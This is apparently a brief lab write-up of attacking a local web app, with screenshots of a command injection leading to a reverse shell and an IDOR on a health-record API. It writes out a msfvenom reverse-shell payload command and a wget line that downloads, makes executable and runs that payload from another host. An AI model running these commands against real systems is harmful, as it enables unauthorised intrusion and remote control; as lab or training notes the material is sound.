![image](https://github.com/user-attachments/assets/c7470cde-8c47-48a6-90cb-367623fb33a0)

Exploiting the Command injection VUlnerailites


This was done by using the command ls
![image](https://github.com/user-attachments/assets/b19d6cd8-18c6-4d95-960f-0ae87670d4b4)



Getting a reverse shell
 
Then which sh
![image](https://github.com/user-attachments/assets/0d19245f-df6f-490f-befc-daab2194951f)

nc 
![image](https://github.com/user-attachments/assets/7c3f2194-7a11-4663-b6ee-9161940d0ea5)


all the above binary were present but didnt work
sh throwing erro

![image](https://github.com/user-attachments/assets/27a4698a-6592-4940-a468-38889372839f)


nc throwing error

![image](https://github.com/user-attachments/assets/5949dd6a-7752-4e21-8180-b8685d9135ed)

This was finally done by using a static linux binary created using msfconsole and wget 

`msfvenom -p linux/x64/shell_reverse_tcp  LHOST=172.22.0.1  LPORT=2294 -f elf -o shell.elf`

this was what was used eventually
wget http://172.22.0.1/shell.elf -O /tmp/shell; chmod +x /tmp/shell; /tmp/shell

wget showig blank after reverse shell has worked 
![image](https://github.com/user-attachments/assets/857beee2-5ab7-4ccc-a306-ba9b5aeb814e)

shell gained 
![image](https://github.com/user-attachments/assets/931e07d6-0e0a-41eb-9029-d5f7333ecffb)
  


IDOR
This works by just changing the value after "record" in http://127.0.0.1:3001/api/health/record/2
![image](https://github.com/user-attachments/assets/57a8849d-33de-465d-909e-3c4cd4b224b5)


or  by changgint the ministry

![image](https://github.com/user-attachments/assets/11de61f1-cb93-4fdc-aaae-10d9b8182bcf)

